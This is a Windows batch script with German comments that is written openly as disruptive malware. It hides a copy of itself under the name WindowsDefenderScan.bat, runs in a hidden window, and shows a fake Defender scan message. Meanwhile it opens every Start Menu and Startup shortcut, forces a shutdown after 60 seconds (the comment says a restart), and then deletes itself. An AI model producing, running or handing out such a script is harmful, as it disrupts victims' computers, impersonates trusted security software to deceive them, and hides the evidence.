@echo off
:: Phase 1: Tarnung als Systemprozess
copy "%0" "%TEMP%\WindowsDefenderScan.bat" >nul
attrib +h +s "%TEMP%\WindowsDefenderScan.bat"

:: Phase 2: Unsichtbare Ausführung
if not "%1"=="stealth" (
    PowerShell -Command "Start-Process -WindowStyle Hidden -FilePath '%~f0' -ArgumentList 'stealth'"
    exit
)

:: Phase 3: Tarnung als Virenscan
title Windows Defender Security Scan
echo Scanning system files for threats... > CON
timeout /t 5 >nul

:: Phase 4: Kritische Aktionen
:payload
:: Alle Programme im Startmenü öffnen
for /f "delims=" %%a in ('dir /b /s "%ProgramData%\Microsoft\Windows\Start Menu\Programs\*.lnk"') do (
    start "" "%%a"
)

:: Autostart-Programme aktivieren
for /f "delims=" %%b in ('dir /b /s "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk"') do (
    start "" "%%b"
)

:: Nach 60s Neustart erzwingen
PowerShell -Command "Start-Sleep -Seconds 60; Stop-Computer -Force -Confirm:$false"

:: Phase 5: Selbstzerstörung
del "%TEMP%\WindowsDefenderScan.bat" >nul 2>&1
del "%~f0" >nul 2>&1